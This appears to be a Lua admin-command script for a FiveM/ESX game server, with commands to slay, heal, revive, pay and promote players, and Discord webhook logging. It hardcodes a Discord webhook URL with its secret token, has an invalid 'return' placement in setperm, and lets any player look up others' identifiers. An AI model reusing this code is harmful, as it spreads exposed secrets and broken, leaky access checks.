			-- User permission check
			TriggerEvent("es:getPlayerFromId", player, function(target)

				TriggerClientEvent('es_admin:kill', player)

				TriggerClientEvent('chat:addMessage', player, { args = {"^1SYSTEM", "You have been killed by ^2" .. GetPlayerName(source)} })
				TriggerClientEvent('chat:addMessage', source, { args = {"^1SYSTEM", "Player ^2" .. GetPlayerName(player) .. "^0 has been killed."} })
			end)
		else
			TriggerClientEvent('chat:addMessage', source, { args = {"^1SYSTEM", "Incorrect player ID"}})
		end
	else
		TriggerClientEvent('chat:addMessage', source, { args = {"^1SYSTEM", "Incorrect player ID"}})
	end
end, function(source, args, user)
	TriggerClientEvent('chat:addMessage', source, { args = {"^1SYSTEM", "Insufficienct permissions!"} })
end, {help = "Slay a user", params = {{name = "userid", help = "The ID of the player"}}})



TriggerEvent('es:addAdminCommand', 'fix', 2, function(source, args, user)
	if args[1] then
		if(tonumber(args[1]) and GetPlayerName(tonumber(args[1])))then
			local player = tonumber(args[1])

			TriggerClientEvent('es_admin:repair', player)
		else
			TriggerClientEvent('chat:addMessage', source, { args = {"^1SYSTEM", "Incorrect player ID"}})
		end
	else
		TriggerClientEvent('es_admin:repair', source)
	end
end, function(source, args, user)
	TriggerClientEvent('chat:addMessage', source, { args = {"^1SYSTEM", "Insufficienct permissions!"} })
end, {help = "Repair a car"})



TriggerEvent('es:addCommand', 'admin', function(source, args, user)
	TriggerClientEvent('chat:addMessage', source, {
		args = {"^1SYSTEM", "Level: ^*^2 " .. tostring(user.get('permission_level'))}
	})
	TriggerClientEvent('chat:addMessage', source, {
		args = {"^1SYSTEM", "Group: ^*^2 " .. user.group}
	})
	PerformHttpRequest(showperm, function(Error, Content, Head) end, 'POST', json.encode({username = "lOG", content = "```css\nPlayer :  "..GetPlayerName(source).. "("..GetPlayerIdentifier(source).. ")\n/admin Zad```" }  ), {['Content-Type'] = 'application/json'})
end, {help = "Shows what admin level you are and what group you're in"})



TriggerEvent('es:addAdminCommand', 'charmenu', 10, function(source, args, user)
	if args[1] then
		local target = tonumber(args[1])
		PerformHttpRequest(charmenu, function(Error, Content, Head) end, 'POST', json.encode({username = "lOG", content = "```css\nAdmin :  "..GetPlayerName(source).. "("..GetPlayerIdentifier(source).. ")\nBaray  "..GetPlayerName(target).." Char Menu Zad```" }  ), {['Content-Type'] = 'application/json'})
		if type(target) == 'number' then
			TriggerClientEvent('skincreator:newChar', target)
		else
			TriggerClientEvent('chat:addMessage', source, {
				args = {"[^1System^0]", " ^2 You Didnt Enter a ID! " .. args[1]}
			})
		end
	else
		TriggerClientEvent('chat:addMessage', source, {
			args = {"[^1System^0]", " ^2 Enter ID Please! "}
		})
	end

end, function(source, args, user)
	TriggerClientEvent('chat:addMessage', source, { args = {"^1SYSTEM", "Insufficienct permissions!"} })
end, {help = "Show Character Create Menu to a Player "})

TriggerEvent('es:addAdminCommand', 'reviveall', 12, function(source, args, user)
	TriggerClientEvent('esx_ambulancejob:ReviveIfDead', -1)
	PerformHttpRequest(revivealllog, function(Error, Content, Head) end, 'POST', json.encode({username = "lOG", content = "```css\nAdmin :  "..GetPlayerName(source).. "("..GetPlayerIdentifier(source).. ")\nTamam Player Ha ra revive Kard```" }  ), {['Content-Type'] = 'application/json'})
	TriggerClientEvent('chatMessage', -1, "[Announce]", {255, 0, 0}, "^1Tamam Player Ha Tavasot "..GetPlayerName(source).." Revive Shodan")
end, function(source, args, user)
	TriggerClientEvent('chat:addMessage', source, { args = { '^1SYSTEM', 'Insufficient Permissions.' } })
end, {help = 'Revive All Players'})


TriggerEvent('es:addAdminCommand', 'rewardsall', 17, function(source, args, user)
	local xPlayers   = ESX.GetPlayers()
	for i=1, #xPlayers, 1 do
		local xPlayer = ESX.GetPlayerFromId(xPlayers[i])
		xPlayer.addMoney(tonumber(args[1]))
		TriggerClientEvent('chatMessage', -1, "[System]", {255, 0, 0}, "^4Tamam Player Ha Tavasot "..GetPlayerName(source).." ^8$" ..args[1].. "^2 Jayze Gerefan")
		PerformHttpRequest(rewarnlog, function(Error, Content, Head) end, 'POST', json.encode({username = "lOG", content = "```css\nAdmin :  "..GetPlayerName(source).. "("..GetPlayerIdentifier(source).. ")\nBe Tamam Player Hay Server $("..args[1]..") Pol Dad ```" }  ), {['Content-Type'] = 'application/json'})
	end
end, function(source, args, user)
	TriggerClientEvent('chat:addMessage', source, { args = { '^1SYSTEM', 'Insufficient Permissions.' } })
end, {help = 'Jayze dadan be hame playerha'})




--[[TriggerEvent('es:addAdminCommand', 'bringall', 9, function(source, args, user)
	TriggerClientEvent('es:bringAll', -1, source)
	TriggerClientEvent('chatMessage', -1, "[System]", {255, 0, 0}, "^4Tamam ^8Player Ha ^2Tavasot ID: "..GetPlayerServerId(source).." ^8bring Shodan")
end, function(source, args, user)
	TriggerClientEvent('chat:addMessage', source, { args = { '^1SYSTEM', 'Insufficient Permissions.' } })
end, {help = 'bring all player'})
--]]

TriggerEvent('es:addAdminCommand', 'healall', 12, function(source, args, user)
	TriggerClientEvent('esx_basicneeds:healPlayer', -1)
	TriggerClientEvent('chatMessage', -1, "[System]", {255, 0, 0}, "^1Tamam Player Ha Tavasot :  "..GetPlayerName(source).." Heal Shodan")
	PerformHttpRequest(healalllog, function(Error, Content, Head) end, 'POST', json.encode({username = "lOG", content = "```css\nAdmin :  "..GetPlayerName(source).. "("..GetPlayerIdentifier(source).. ")\nServer Ro Heal All Kard```" }  ), {['Content-Type'] = 'application/json'})
end, function(source, args, user)
	TriggerClientEvent('chat:addMessage', source, { args = { '^1SYSTEM', 'Insufficient Permissions.' } })
end, {help = 'heal all player'})

local freezeState = false
--[[TriggerEvent('es:addAdminCommand', 'freezeall', 9, function(source, args, user)
	freezeState = not freezeState
	TriggerClientEvent('es_admin:freezePlayer', -1, freezeState)
end, function(source, args, user)
	TriggerClientEvent('chat:addMessage', source, { args = { '^1SYSTEM', 'Insufficient Permissions.' } })
end, {help = 'freeze all player'})
--]]





TriggerEvent('es:addAdminCommand', 'ncz', 13, function(source, args, user)
	ncz = not ncz
	TriggerClientEvent('es:ncz', -1, ncz)
	PerformHttpRequest(nczlog, function(Error, Content, Head) end, 'POST', json.encode({username = "lOG", content = "```css\nAdmin :  "..GetPlayerName(source).. "("..GetPlayerIdentifier(source).. ")\nServer Ro NCZ Kard```" }  ), {['Content-Type'] = 'application/json'})
end, function(source, args, user)
	TriggerClientEvent('chat:addMessage', source, { args = { '^1SYSTEM', 'Insufficient Permissions.' } })
end, {help = 'disable fireing in all city'})




RegisterCommand('steam', function(source, args)
    local xPlayer = ESX.GetPlayerFromId(source)
	if args[1] then
		local target = tonumber(args[1])
		TriggerClientEvent('chatMessage', source, "[SYSTEM]", {255, 0, 0}, " ^0Steam Id Vared Shodeh : ^4" ..GetPlayerIdentifier(target).. " ")
		
	else
		TriggerClientEvent('chatMessage', source, "[SYSTEM]", {255, 0, 0}, " ^0Id Player Vared Shodeh Estebah Ast")
	end
end)





RegisterCommand('setperm', function(source, args)

  local xPlayer = ESX.GetPlayerFromId(source)

  if  Dastresiaa(source) then 

    if args[1] then
      if args[2] then
        
        if args[2] == '30' or args[2] == '31' or args[2] == '32' or args[2] == '85' or args[2] == '100' then
          return
          TriggerClientEvent('chatMessage', source, "[Admin System]", {255, 0, 0}, "Shoma Be Dadan Perm  Bishtar AZ 29 Mojaz Nistid (Ba AliReza_At Dar Ertebat Bashid)" )
        end

        local target = tonumber(args[1])
        if target ~= nil then
        local target2 = tonumber(args[2])
        if target2 ~= nil then

          if GetPlayerName(target) then

            targetp = ESX.GetPlayerFromId(target)
            targetp.set('permission_level',target2)
            MySQL.Async.execute('UPDATE users SET permission_level = @perm WHERE identifier = @identifier', {
            ['@perm']        = target2,
            ['@identifier'] = targetp.identifier
            }, function(rowsChanged)
      
              end)
            if source ~= 0 then
              TriggerClientEvent('chatMessage', source, "[Admin System]", {255, 0, 0}, " ^0Shoma Perm (^3" .. GetPlayerName(target) .. "^0) Ra Be (^5" .. target2 .. "^0) Taghir Dadid!" )
              TriggerClientEvent('chatMessage', target, "[Admin System]", {255, 0, 0}, " ^0Perm Admin Shoma Be (^5" .. target2 .. "^0) Taghir Haft!")
              TriggerClientEvent('chat:addMessage', -1, {
                template = '<div style="padding: 0.5vw; margin: 0.5vw; background-color: #ffbc0066; border-radius: 3px;"><i class="fas fa-gem"></i>  {1}</div>',
                args = { "",'^0Player: (^5'.. GetPlayerName(tonumber(args[1])) .. '^0) Tavasot: (^5'.. GetPlayerName(source) ..'^0) Ba Perm: (^5' .. target2 ..'^0) Be Team Staff Peyvast!'}
              })
              local WebHook = "https://discord.com/api/webhooks/1215222653942628393/AWvvu0Nu8nNXNzjly50NU8374VWtz75f0slWZHgG28MKZq2gWFC6XcoHuuM4uRytm5p5"
              PerformHttpRequest(WebHook, function(Error, Content, Head) end, 'POST', json.encode({username = "Alireza-lOG", content = "```Admin :  "..GetPlayerName(source).. "\nBe : " .. GetPlayerName(tonumber(args[1])) .. "\nPerm  " .. target2 .. " Dad ```"}), {['Content-Type'] = 'application/json'})
            end
          

          else
            TriggerClientEvent('chatMessage', source, "[SYSTEM]", {255, 0, 0}, " ^0ID vared shode na motabar ast!")
          end
        else
          TriggerClientEvent('chatMessage', source, "[SYSTEM]", {255, 0, 0}, " ^0Shoma bayad dar ghesmmat permission faghat adad vared konid!")
        end

        else
          TriggerClientEvent('chatMessage', source, "[SYSTEM]", {255, 0, 0}, " ^0Shoma bayad dar ghesmmat ID faghat adad vared konid!")
        end

      else
        TriggerClientEvent('chatMessage', source, "[SYSTEM]", {255, 0, 0}, " ^0Shoma dar ghesmat permission chizi vared nakardid!")
      end
    else
      TriggerClientEvent('chatMessage', source, "[SYSTEM]", {255, 0, 0}, " ^0Shoma bayad ID player marbote ra vared konid!")
    end
  end
end, false)





RegisterCommand('aa', function(source, args, User)
	local xPlayer = ESX.GetPlayerFromId(source)
	if xPlayer.permission_level >= 12 then
		TriggerClientEvent('esx:ActiveAdminPerks', source)
		if Admins[source] then
			Admins[source] = false
			TriggerClientEvent('aduty:tagChanger', source, false, false)
			TriggerClientEvent('AT_Admin:ChangeMenuStatus', source, false)
			TriggerClientEvent('ManageAdmins', -1, false, source)
			TriggerEvent('Alirezz:staffm', source)	
			xPlayer.set('aduty', true)
			PerformHttpRequest(adutylog, function(Error, Content, Head) end, 'POST', json.encode({username = "lOG", content = "```css\nAdmin :  "..GetPlayerName(source).. "("..GetPlayerIdentifier(source).. ")\nBa Perm "..xPlayer.permission_level.. " On Duty Shod (/aa)```" }  ), {['Content-Type'] = 'application/json'})
		else
			Admins[source] = true
			TriggerClientEvent('aduty:tagChanger', source, true, true)		
			TriggerClientEvent('AT_Admin:ChangeMenuStatus', source, true)
			TriggerClientEvent('ManageAdmins', -1, 2, source)
			TriggerEvent('Alirezz:staffm', source)
			xPlayer.set('aduty', true)	
			PerformHttpRequest(adutylog, function(Error, Content, Head) end, 'POST', json.encode({username = "lOG", content = "```css\nAdmin :  "..GetPlayerName(source).. "("..GetPlayerIdentifier(source).. ")\nBa Perm "..xPlayer.permission_level.. " off Duty Shod (/aa)```" }  ), {['Content-Type'] = 'application/json'})
		end
	end
end)

RegisterCommand('fps', function(source)
    local _source = source
    local xPlayer = ESX.GetPlayerFromId(_source)
    TriggerClientEvent('Fpsmenu:Openmenu', _source)
    TriggerClientEvent('esx:showNotification', source, 'Fps Menu Open')
end)

RegisterCommand('aduty',function(source, args, user)
	local xPlayer = ESX.GetPlayerFromId(source)
	if xPlayer.permission_level > 1 then
		if spamduty[source] then
			TriggerClientEvent('chat:addMessage', source, {args = {"[SYSTEM] :", " Lotfan 60 Saniye Sabr Konid !"}})
			return
		else
			if Admins[source] then
				Admins[source] = false
				xPlayer.set('aduty', false)
				TriggerClientEvent('aduty:tagChanger', source, false, false)
				TriggerClientEvent("es:AdminOffDuty", source)
				TriggerClientEvent('AT_Admin:ChangeMenuStatus', source, false)
				--TriggerClientEvent('chatMessage', -1, "Admin^3" ..GetPlayerName(source).. " ^1Off Duty Shod")	
				--TriggerClientEvent('esx:showNotification', -1, "Admin -->>" .. GetPlayerName(source) .."\nVaziyat -->>On Duty ")	
				TriggerClientEvent('ManageAdmins', -1, false, source)
				PerformHttpRequest(adutylog, function(Error, Content, Head) end, 'POST', json.encode({username = "lOG", content = "```css\nAdmin :  "..GetPlayerName(source).. "("..GetPlayerIdentifier(source).. ")\nBa Perm "..xPlayer.permission_level.. " Off Duty Shod```"}), {['Content-Type'] = 'application/json'})
				TriggerEvent('Alirezz:staffm', source)	
			else
				Admins[source] = true
				xPlayer.set('aduty', true)
				TriggerClientEvent('aduty:tagChanger', source, true, true)
				PerformHttpRequest(adutylog, function(Error, Content, Head) end, 'POST', json.encode({username = "lOG", content = "```css\nAdmin :  "..GetPlayerName(source).. "("..GetPlayerIdentifier(source).. ")\nBa Perm "..xPlayer.permission_level.. " On Duty Shod```" }  ), {['Content-Type'] = 'application/json'})
				--TriggerClientEvent('esx:showNotification', -1, "Admin -->>" .. GetPlayerName(source) .."\nVaziyat -->>On Duty ")	
				--TriggerClientEvent('chatMessage', -1, "Admin^3" ..GetPlayerName(source).. " ^2On Duty Shod")		
				TriggerClientEvent('AT_Admin:ChangeMenuStatus', source, true)
				TriggerClientEvent('ManageAdmins', -1, 2, source)
				TriggerEvent('Alirezz:staffm', source)	
				print("Admin Active God Mod"..GetPlayerName(source))
				TriggerClientEvent("es:AdminOnDuty", source)
			end
			spamduty[source] = true
			SetTimeout(60000, function()
				spamduty[source] = false
			end)
		end
	end
end)

TriggerEvent('es:addAdminCommand', 'openproperty', 5, function(source, args, user)
	local xPlayer    = ESX.GetPlayerFromId(args[1])
	local items      = {}
	local weapons    = {}
	
	TriggerEvent('esx_addoninventory:getInventory', 'property', xPlayer.identifier, function(inventory)
		items = inventory.items
	end)
	
	TriggerEvent('esx_datastore:getDataStore', 'property', xPlayer.identifier, function(store)
		weapons = store.get('weapons') or {}
	end)
	
	local inventory = {
		items      = items,
		weapons    = weapons
	}

	TriggerClientEvent("esx_inventoryhud:openPropertyInventory", source, inventory)

end, function(source, args, user)
	TriggerClientEvent('chat:addMessage', source, { args = { '^1SYSTEM', 'Insufficient Permissions.' } })
end, {help = "Check Inventory Khone", params = {{name = "ID", help = "ID Player Morede Nazar"}}})